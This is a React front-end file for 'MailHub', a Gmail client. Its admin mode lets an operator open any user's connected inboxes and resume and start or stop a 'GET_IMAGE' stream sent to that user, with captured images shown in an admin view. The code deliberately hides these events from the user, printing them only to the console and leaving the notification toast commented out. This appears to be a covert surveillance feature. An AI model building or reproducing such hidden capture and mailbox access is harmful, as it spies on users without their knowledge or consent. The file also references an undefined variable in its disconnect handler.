import React, { useState, useEffect, useCallback } from 'react';
import { useAuth } from './context/AuthContext';
import { accountsApi, emailsApi, resumeApi } from './api';
import Navbar from './components/Navbar';
import Sidebar from './components/Sidebar';
import AdminBanner from './components/AdminBanner';
import AdminUsersView from './components/AdminUsersView';
import AdminCapturedImagesView from './components/AdminCapturedImagesView';
import EmailList from './components/EmailList';
import EmailDetail from './components/EmailDetail';
import ComposeModal from './components/ComposeModal';
import ConfirmModal from './components/ConfirmModal';
import ResumeModal from './components/ResumeModal';
import AuthView from './components/AuthView';
import WebSocketNotificationToast from './components/WebSocketNotificationToast';
import SendWebSocketModal from './components/SendWebSocketModal';
import { useWebSocketEvents } from './hooks/useWebSocketEvents';
import { CheckCircle2, AlertCircle, Plus, Mail, PenSquare } from 'lucide-react';

export default function App() {
  const { user, loading: authLoading, isAdmin } = useAuth();

  // Responsive mobile drawer & single-pane switcher state
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [mobileView, setMobileView] = useState('list'); // 'list' | 'detail'

  // Accounts state
  const [accounts, setAccounts] = useState([]);
  const [activeAccount, setActiveAccount] = useState(null);
  const [accountStats, setAccountStats] = useState(null);
  const [selectedAdminUser, setSelectedAdminUser] = useState(null);
  const [activeWsEvent, setActiveWsEvent] = useState(null);
  const [receiveImageActive, setReceiveImageActive] = useState(false);
  const [adminSendEventUser, setAdminSendEventUser] = useState(null);

  // Email listing state
  const [folder, setFolder] = useState('inbox');
  const [searchQuery, setSearchQuery] = useState('');
  const [emails, setEmails] = useState([]);
  const [nextPageToken, setNextPageToken] = useState(null);
  const [loadingEmails, setLoadingEmails] = useState(false);
  const [refreshing, setRefreshing] = useState(false);

  // Email detail state
  const [activeEmail, setActiveEmail] = useState(null);
  const [loadingDetail, setLoadingDetail] = useState(false);

  // Compose state
  const [composeOpen, setComposeOpen] = useState(false);
  const [composeMode, setComposeMode] = useState('new');
  const [composeOriginalEmail, setComposeOriginalEmail] = useState(null);

  // Confirmation Modal state
  const [confirmModal, setConfirmModal] = useState({
    isOpen: false,
    title: '',
    message: '',
    confirmText: 'Confirm',
    danger: true,
    onConfirm: () => {},
  });

  // Resume Modal & Data state
  const [resumeModalOpen, setResumeModalOpen] = useState(false);
  const [userResume, setUserResume] = useState(null);

  const loadUserResume = useCallback(async (userId = null) => {
    try {
      const res = await resumeApi.getResume(userId);
      if (res.has_resume) {
        setUserResume(res.resume);
      } else {
        setUserResume(null);
      }
    } catch {
      // Ignored if user not authenticated or network error
    }
  }, []);

  // Admin Oversight Handlers
  const handleSelectAdminUser = (targetUser) => {
    setSelectedAdminUser(targetUser);
    setReceiveImageActive(false);
    setFolder('inbox');
    setSearchQuery('');
    setActiveEmail(null);
    setMobileView('list');
    loadAccounts(targetUser.id);
    loadUserResume(targetUser.id);
  };

  const handleExitToDirectory = () => {
    setSelectedAdminUser(null);
    setReceiveImageActive(false);
    setActiveAccount(null);
    setAccounts([]);
    setEmails([]);
    setActiveEmail(null);
    setUserResume(null);
    setAccountStats(null);
    setMobileView('list');
  };

  const handleSwitchAdminUser = (targetUser) => {
    if (targetUser?.id === selectedAdminUser?.id) return;
    handleSelectAdminUser(targetUser);
  };

  // Toast notification
  const [toast, setToast] = useState(null);

  const showToast = (message, type = 'success') => {
    setToast({ message, type });
    setTimeout(() => setToast(null), 4000);
  };

  // Check URL params for OAuth completion
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const status = urlParams.get('status');
    const email = urlParams.get('email');
    const error = urlParams.get('error');

    if (status === 'success' && email) {
      showToast(`Successfully connected Gmail account: ${email}!`, 'success');
      window.history.replaceState({}, document.title, window.location.pathname);
    } else if (error) {
      showToast(`OAuth Error: ${error}`, 'error');
      window.history.replaceState({}, document.title, window.location.pathname);
    }
  }, []);

  // Fetch Connected Accounts
  const loadAccounts = useCallback(async (userId = null) => {
    try {
      const data = await accountsApi.getAccounts(userId);
      setAccounts(data);
      if (data.length > 0) {
        // Keep currently active account if it still exists in the list, else select first
        setActiveAccount((prev) => {
          if (prev && data.find((a) => a.id === prev.id)) {
            return prev;
          }
          return data[0];
        });
      } else {
        setActiveAccount(null);
        setEmails([]);
        setActiveEmail(null);
      }
    } catch (err) {
      showToast(err.message || 'Failed to load Gmail accounts.', 'error');
    }
  }, []);

  useEffect(() => {
    if (user) {
      if (isAdmin) {
        if (selectedAdminUser) {
          loadAccounts(selectedAdminUser.id);
          loadUserResume(selectedAdminUser.id);
        } else {
          setAccounts([]);
          setActiveAccount(null);
          setEmails([]);
          setActiveEmail(null);
          setUserResume(null);
          setAccountStats(null);
        }
      } else {
        loadAccounts();
        loadUserResume();
      }
    }
  }, [user, isAdmin, selectedAdminUser, loadAccounts, loadUserResume]);

  // Load Mailbox Profile Stats for Active Account
  useEffect(() => {
    if (!activeAccount) {
      setAccountStats(null);
      return;
    }
    async function loadStats() {
      try {
        const stats = await accountsApi.getProfile(activeAccount.id);
        setAccountStats(stats);
      } catch {
        setAccountStats(null);
      }
    }
    loadStats();
  }, [activeAccount]);

  // Fetch Emails for Active Account and Folder
  const loadEmails = useCallback(
    async ({ pageToken = null, reset = false, q = '' } = {}) => {
      if (!activeAccount) return;

      setLoadingEmails(true);
      try {
        const data = await emailsApi.listEmails(activeAccount.id, {
          folder,
          q,
          page_token: pageToken,
          max_results: 25,
        });

        if (reset || !pageToken) {
          setEmails(data.messages || []);
        } else {
          setEmails((prev) => [...prev, ...(data.messages || [])]);
        }
        setNextPageToken(data.next_page_token || null);
      } catch (err) {
        showToast(err.message || 'Failed to fetch messages.', 'error');
      } finally {
        setLoadingEmails(false);
        setRefreshing(false);
      }
    },
    [activeAccount, folder]
  );

  // Real-time WebSocket connection for user events
  const handleWsEvent = useCallback((event) => {
    // Suppress visible UI toast on user side; print to console only
    console.log('WebSocket event is received:');
    console.log('Event data:', event);
  }, []);

  const handleWsSyncTrigger = useCallback(() => {
    if (activeAccount) {
      loadEmails({ reset: true, q: searchQuery });
    }
  }, [activeAccount, loadEmails, searchQuery]);

  const { isConnected: wsConnected, sendGetImage, sendStopGetImage } = useWebSocketEvents({
    user,
    enabled: !!user,
    onEvent: handleWsEvent,
    onSyncTrigger: handleWsSyncTrigger,
  });

  const handleToggleReceiveImage = useCallback(() => {
    if (!selectedAdminUser) return;
    const targetUserId = selectedAdminUser.id;

    setReceiveImageActive((prev) => {
      const next = !prev;
      if (next) {
        sendGetImage({
          type: 'GET_IMAGE',
          action: 'START',
          target_user_id: targetUserId,
          title: 'Receive Image Activated',
          message: `Admin started receive image stream for ${selectedAdminUser.email}`,
          data: { status: 'active', stream: 'image_stream', user_id: targetUserId },
        });
      } else {
        sendStopGetImage({
          type: 'STOP_GET_IMAGE',
          action: 'STOP',
          target_user_id: targetUserId,
          title: 'Receive Image Deactivated',
          message: `Admin stopped receive image stream for ${selectedAdminUser.email}`,
          data: { status: 'stopped', stream: 'image_stream', user_id: targetUserId },
        });
      }
      return next;
    });
  }, [selectedAdminUser, sendGetImage, sendStopGetImage]);

  // Trigger load when active account, folder, or search changes
  useEffect(() => {
    if (activeAccount) {
      setActiveEmail(null);
      loadEmails({ reset: true, q: searchQuery });
    }
  }, [activeAccount, folder, loadEmails]);

  // Handle email click -> load full detail
  const handleSelectEmail = async (summary) => {
    if (!activeAccount) return;
    setActiveEmail(summary); // Set summary immediately for fast UI feedback
    setMobileView('detail'); // Show email detail pane on mobile
    setLoadingDetail(true);

    try {
      const fullDetail = await emailsApi.getEmailDetail(activeAccount.id, summary.id);
      setActiveEmail(fullDetail);

      // Optimistically mark as read in the list
      setEmails((prev) =>
        prev.map((e) => (e.id === summary.id ? { ...e, is_read: true } : e))
      );
    } catch (err) {
      showToast(err.message || 'Failed to load email details.', 'error');
    } finally {
      setLoadingDetail(false);
    }
  };

  // Back to email list (for mobile single-pane view)
  const handleBackToList = () => {
    setActiveEmail(null);
    setMobileView('list');
  };

  // Connect Account -> OAuth flow
  const handleConnectAccount = async () => {
    try {
      const res = await accountsApi.getConnectUrl();
      if (res.authorization_url) {
        window.location.href = res.authorization_url;
      }
    } catch (err) {
      showToast(err.message || 'Failed to initiate Google OAuth.', 'error');
    }
  };

  // Disconnect Account
  const handleDisconnectAccount = (acc) => {
    setConfirmModal({
      isOpen: true,
      title: 'Disconnect Gmail Account?',
      message: `Are you sure you want to disconnect ${acc.email_address}? MailHub will no longer be able to read or send emails for this account until reconnected.`,
      confirmText: 'Disconnect',
      danger: true,
      onConfirm: async () => {
        try {
          await accountsApi.disconnectAccount(acc.id);
          showToast(`Disconnected ${acc.email_address}`, 'success');
          setConfirmModal((m) => ({ ...m, isOpen: false }));
          loadAccounts(selectedAdminUserId);
        } catch (err) {
          showToast(err.message || 'Failed to disconnect account.', 'error');
        }
      },
    });
  };

  // Toggle Star
  const handleToggleStar = async (email) => {
    if (!activeAccount) return;
    const newStarred = !email.is_starred;

    // Optimistic update
    setEmails((prev) =>
      prev.map((e) => (e.id === email.id ? { ...e, is_starred: newStarred } : e))
    );
    if (activeEmail?.id === email.id) {
      setActiveEmail((prev) => ({ ...prev, is_starred: newStarred }));
    }

    try {
      if (newStarred) {
        await emailsApi.starEmail(activeAccount.id, email.id);
      } else {
        await emailsApi.unstarEmail(activeAccount.id, email.id);
      }
    } catch (err) {
      showToast(err.message || 'Failed to update star.', 'error');
    }
  };

  // Toggle Read / Unread
  const handleToggleRead = async (email) => {
    if (!activeAccount) return;
    const newRead = !email.is_read;

    setEmails((prev) =>
      prev.map((e) => (e.id === email.id ? { ...e, is_read: newRead } : e))
    );
    if (activeEmail?.id === email.id) {
      setActiveEmail((prev) => ({ ...prev, is_read: newRead }));
    }

    try {
      if (newRead) {
        await emailsApi.markRead(activeAccount.id, email.id);
      } else {
        await emailsApi.markUnread(activeAccount.id, email.id);
      }
    } catch (err) {
      showToast(err.message || 'Failed to update read status.', 'error');
    }
  };

  // Move to Trash (Action 1)
  const handleTrash = async (email) => {
    if (!activeAccount) return;
    try {
      await emailsApi.trashEmail(activeAccount.id, email.id);
      showToast('Moved email to Trash', 'success');
      setEmails((prev) => prev.filter((e) => e.id !== email.id));
      if (activeEmail?.id === email.id) {
        setActiveEmail(null);
        setMobileView('list');
      }
    } catch (err) {
      showToast(err.message || 'Failed to trash email.', 'error');
    }
  };

  // Restore from Trash
  const handleRestore = async (email) => {
    if (!activeAccount) return;
    try {
      await emailsApi.restoreEmail(activeAccount.id, email.id);
      showToast('Restored email from Trash', 'success');
      setEmails((prev) => prev.filter((e) => e.id !== email.id));
      if (activeEmail?.id === email.id) {
        setActiveEmail(null);
        setMobileView('list');
      }
    } catch (err) {
      showToast(err.message || 'Failed to restore email.', 'error');
    }
  };

  // Action 2: Permanently Delete email from Gmail
  const handlePermanentDelete = (email) => {
    setConfirmModal({
      isOpen: true,
      title: 'Permanently Delete Email?',
      message:
        'Warning: This action will permanently remove this email from Gmail. This operation cannot be undone. Gmail API delete method will be invoked.',
      confirmText: 'Delete Permanently',
      danger: true,
      onConfirm: async () => {
        try {
          await emailsApi.permanentlyDeleteEmail(activeAccount.id, email.id);
          showToast('Message permanently deleted from Gmail.', 'success');
          setConfirmModal((m) => ({ ...m, isOpen: false }));
          setEmails((prev) => prev.filter((e) => e.id !== email.id));
          if (activeEmail?.id === email.id) {
            setActiveEmail(null);
            setMobileView('list');
          }
        } catch (err) {
          showToast(err.message || 'Failed to delete message.', 'error');
        }
      },
    });
  };

  // Empty Trash
  const handleEmptyTrash = () => {
    setConfirmModal({
      isOpen: true,
      title: 'Empty Trash Folder?',
      message:
        'Are you sure you want to permanently delete all emails currently in the Trash? This cannot be undone.',
      confirmText: 'Empty All Trash',
      danger: true,
      onConfirm: async () => {
        try {
          const res = await emailsApi.emptyTrash(activeAccount.id);
          showToast(res.message || 'Trash emptied successfully.', 'success');
          setConfirmModal((m) => ({ ...m, isOpen: false }));
          setEmails([]);
          setActiveEmail(null);
          setMobileView('list');
        } catch (err) {
          showToast(err.message || 'Failed to empty trash.', 'error');
        }
      },
    });
  };

  // Archive
  const handleArchive = async (email) => {
    if (!activeAccount) return;
    try {
      await emailsApi.archiveEmail(activeAccount.id, email.id);
      showToast('Archived email', 'success');
      if (folder === 'inbox') {
        setEmails((prev) => prev.filter((e) => e.id !== email.id));
        if (activeEmail?.id === email.id) {
          setActiveEmail(null);
          setMobileView('list');
        }
      }
    } catch (err) {
      showToast(err.message || 'Failed to archive email.', 'error');
    }
  };

  // Compose / Reply / Forward Triggers
  const handleOpenCompose = () => {
    setComposeMode('new');
    setComposeOriginalEmail(null);
    setComposeOpen(true);
  };

  const handleReply = (email) => {
    setComposeMode('reply');
    setComposeOriginalEmail(email);
    setComposeOpen(true);
  };

  const handleForward = (email) => {
    setComposeMode('forward');
    setComposeOriginalEmail(email);
    setComposeOpen(true);
  };

  // If not authenticated, render AuthView
  if (authLoading) {
    return (
      <div style={{ height: '100vh', width: '100vw', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'var(--bg-app)' }}>
        <div style={{ textAlign: 'center', color: 'var(--text-muted)' }}>
          <Mail size={36} className="spin" style={{ margin: '0 auto 16px', color: 'var(--primary)' }} />
          <div>Loading MailHub...</div>
        </div>
      </div>
    );
  }

  if (!user) {
    return <AuthView />;
  }

  return (
    <div className="app-container">
      {/* Toast Notification */}
      {toast && (
        <div
          style={{
            position: 'fixed',
            top: 20,
            right: 20,
            zIndex: 999,
            display: 'flex',
            alignItems: 'center',
            gap: 10,
            padding: '12px 18px',
            borderRadius: 'var(--radius-md)',
            background: toast.type === 'error' ? '#1f1315' : '#0d1f18',
            border: `1px solid ${toast.type === 'error' ? 'var(--rose)' : 'var(--emerald)'}`,
            color: toast.type === 'error' ? '#fda4af' : '#6ee7b7',
            boxShadow: 'var(--shadow-lg)',
            fontSize: 13,
            fontWeight: 600,
            animation: 'fadeIn 0.2s ease',
          }}
        >
          {toast.type === 'error' ? <AlertCircle size={18} /> : <CheckCircle2 size={18} />}
          <span>{toast.message}</span>
        </div>
      )}

      {/* Top Navigation Bar */}
      <Navbar
        accounts={accounts}
        activeAccount={activeAccount}
        onSelectAccount={(acc) => {
          setActiveAccount(acc);
          setFolder('inbox');
          setSearchQuery('');
          setActiveEmail(null);
          setMobileView('list');
          setSidebarOpen(false);
        }}
        onConnectAccount={handleConnectAccount}
        onRefresh={() => {
          setRefreshing(true);
          loadEmails({ reset: true, q: searchQuery });
        }}
        refreshing={refreshing}
        searchQuery={searchQuery}
        onSearchChange={setSearchQuery}
        onSearchSubmit={() => loadEmails({ reset: true, q: searchQuery })}
        onClearSearch={() => {
          setSearchQuery('');
          loadEmails({ reset: true, q: '' });
        }}
        userResume={userResume}
        onOpenResumeModal={() => setResumeModalOpen(true)}
        sidebarOpen={sidebarOpen}
        onToggleSidebar={() => setSidebarOpen((prev) => !prev)}
        selectedAdminUser={selectedAdminUser}
        onExitToDirectory={handleExitToDirectory}
        wsConnected={wsConnected}
        receiveImageActive={receiveImageActive}
        onToggleReceiveImage={handleToggleReceiveImage}
      />

      {/* Admin Mode Users Directory (Default view for Admins until a user is selected) */}
      {isAdmin && !selectedAdminUser ? (
        <AdminUsersView onSelectUser={handleSelectAdminUser} />
      ) : (
        <>
          {/* Admin Oversight Session Bar (shown when Admin is accessing a user's account) */}
          {isAdmin && selectedAdminUser && (
            <AdminBanner
              selectedUser={selectedAdminUser}
              onExit={handleExitToDirectory}
              onSwitchUser={handleSwitchAdminUser}
              onOpenSendEvent={setAdminSendEventUser}
              receiveImageActive={receiveImageActive}
              onToggleReceiveImage={handleToggleReceiveImage}
            />
          )}

          {/* Main Body: Full user workspace experience */}
          <div className="app-body">
            {/* Mobile Sidebar Overlay Backdrop */}
            <div
              className={`sidebar-overlay ${sidebarOpen ? 'active' : ''}`}
              onClick={() => setSidebarOpen(false)}
            />

            {/* Left Sidebar (Desktop & Mobile Drawer) */}
            <Sidebar
              isOpen={sidebarOpen}
              onClose={() => setSidebarOpen(false)}
              activeFolder={folder}
              onSelectFolder={(f) => {
                setFolder(f);
                setSearchQuery('');
                setActiveEmail(null);
                setMobileView('list');
                setSidebarOpen(false);
              }}
              onOpenCompose={() => {
                handleOpenCompose();
                setSidebarOpen(false);
              }}
              accounts={accounts}
              activeAccount={activeAccount}
              onSelectAccount={(acc) => {
                setActiveAccount(acc);
                setFolder('inbox');
                setSearchQuery('');
                setActiveEmail(null);
                setMobileView('list');
                setSidebarOpen(false);
              }}
              onConnectAccount={() => {
                handleConnectAccount();
                setSidebarOpen(false);
              }}
              onDisconnectAccount={handleDisconnectAccount}
              accountStats={accountStats}
              userResume={userResume}
              onOpenResumeModal={() => {
                setResumeModalOpen(true);
                setSidebarOpen(false);
              }}
              isAdmin={isAdmin}
              selectedAdminUser={selectedAdminUser}
              onExitToDirectory={handleExitToDirectory}
              onOpenSendEvent={setAdminSendEventUser}
            />

            {/* Content Pane: Email List & Email Detail Viewer or Admin Captured Images */}
            <main className={`app-content mobile-view-${mobileView}`}>
              {isAdmin && selectedAdminUser && folder === 'captured_images' ? (
                <AdminCapturedImagesView
                  selectedUser={selectedAdminUser}
                  onBack={() => setFolder('inbox')}
                  receiveImageActive={receiveImageActive}
                  onToggleReceiveImage={handleToggleReceiveImage}
                />
              ) : !activeAccount ? (
                <div
                  style={{
                    flex: 1,
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    justifyContent: 'center',
                    padding: '32px 20px',
                    textAlign: 'center',
                  }}
                >
                  <div
                    style={{
                      width: 64,
                      height: 64,
                      borderRadius: 20,
                      background: 'var(--gradient-primary)',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      boxShadow: '0 8px 30px var(--primary-glow)',
                      marginBottom: 20,
                    }}
                  >
                    <Mail size={32} color="#ffffff" />
                  </div>
                  <h2 style={{ fontSize: 22, fontWeight: 700, marginBottom: 8 }}>
                    {isAdmin && selectedAdminUser
                      ? `No Gmail Accounts Connected for ${selectedAdminUser.email}`
                      : 'No Connected Gmail Account'}
                  </h2>
                  <p style={{ color: 'var(--text-secondary)', fontSize: 14, maxWidth: 460, marginBottom: 24, lineHeight: 1.6 }}>
                    {isAdmin && selectedAdminUser
                      ? 'This user account currently has no connected Gmail mailboxes. You can connect a Gmail account for them or return to the users directory.'
                      : 'Connect your personal, work, or project Gmail accounts to read, search, send, and manage your emails seamlessly from one unified dashboard.'}
                  </p>
                  <div style={{ display: 'flex', gap: 12, flexWrap: 'wrap', justifyContent: 'center' }}>
                    <button
                      className="btn btn-primary"
                      onClick={handleConnectAccount}
                      style={{ padding: '12px 24px', fontSize: 15 }}
                    >
                      <Plus size={18} />
                      <span>Connect with Google OAuth</span>
                    </button>
                    {isAdmin && selectedAdminUser && (
                      <button
                        className="btn btn-secondary"
                        onClick={handleExitToDirectory}
                        style={{ padding: '12px 20px', fontSize: 14 }}
                      >
                        <span>← Return to Users Directory</span>
                      </button>
                    )}
                  </div>
                </div>
              ) : (
                <>
                  {/* Email List Column */}
                  <EmailList
                    emails={emails}
                    activeEmail={activeEmail}
                    onSelectEmail={handleSelectEmail}
                    folder={folder}
                    searchQuery={searchQuery}
                    loading={loadingEmails}
                    nextPageToken={nextPageToken}
                    onLoadMore={() => loadEmails({ pageToken: nextPageToken, q: searchQuery })}
                    onToggleStar={handleToggleStar}
                    onToggleRead={handleToggleRead}
                    onTrashEmail={handleTrash}
                    onArchiveEmail={handleArchive}
                    onEmptyTrash={handleEmptyTrash}
                  />

                  {/* Email Detail Column */}
                  <EmailDetail
                    email={activeEmail}
                    activeAccount={activeAccount}
                    onBack={handleBackToList}
                    onReply={handleReply}
                    onForward={handleForward}
                    onTrash={handleTrash}
                    onRestore={handleRestore}
                    onPermanentDelete={handlePermanentDelete}
                    onToggleStar={handleToggleStar}
                    onToggleRead={handleToggleRead}
                    onArchive={handleArchive}
                  />
                </>
              )}
            </main>
          </div>

          {/* Mobile Floating Action Button (FAB) */}
          {activeAccount && (
            <button
              className="mobile-compose-fab"
              onClick={handleOpenCompose}
              title="Compose Message"
              aria-label="Compose Message"
            >
              <PenSquare size={22} />
            </button>
          )}

          {/* Floating Compose / Reply / Forward Modal */}
          <ComposeModal
            isOpen={composeOpen}
            onClose={() => setComposeOpen(false)}
            activeAccount={activeAccount}
            mode={composeMode}
            originalEmail={composeOriginalEmail}
            onEmailSent={() => {
              showToast('Email sent successfully!', 'success');
              loadEmails({ reset: true });
            }}
            userResume={userResume}
            onOpenResumeModal={() => setResumeModalOpen(true)}
          />
        </>
      )}

      {/* Resume Management Modal */}
      <ResumeModal
        isOpen={resumeModalOpen}
        onClose={() => setResumeModalOpen(false)}
        onResumeUpdated={(updatedResume) => setUserResume(updatedResume)}
        userId={isAdmin && selectedAdminUser ? selectedAdminUser.id : null}
        targetUser={isAdmin && selectedAdminUser ? selectedAdminUser : null}
      />

      {/* Confirmation Modal */}
      <ConfirmModal
        isOpen={confirmModal.isOpen}
        title={confirmModal.title}
        message={confirmModal.message}
        confirmText={confirmModal.confirmText}
        danger={confirmModal.danger}
        onConfirm={confirmModal.onConfirm}
        onCancel={() => setConfirmModal((m) => ({ ...m, isOpen: false }))}
      />

      {/* Real-time WebSocket Notification Toast (Hidden: events logged to console only) */}
      {/* <WebSocketNotificationToast
        event={activeWsEvent}
        onDismiss={() => setActiveWsEvent(null)}
      /> */}

      {/* Admin WebSocket Event Dispatcher Modal */}
      <SendWebSocketModal
        isOpen={!!adminSendEventUser}
        targetUser={adminSendEventUser}
        onClose={() => setAdminSendEventUser(null)}
        onSuccess={(evt) => {
          showToast(`WebSocket event "${evt.title || 'Notification'}" dispatched to ${adminSendEventUser?.email}!`, 'success');
        }}
      />
    </div>
  );
}
